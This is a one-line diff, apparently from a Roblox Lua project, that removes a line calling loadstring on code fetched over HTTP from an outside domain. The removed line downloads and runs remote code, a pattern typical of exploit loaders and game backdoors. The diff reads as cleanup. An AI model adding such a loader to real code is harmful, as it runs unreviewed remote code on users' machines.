@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://shattered-gang.lol/miscguntest.lua"))()
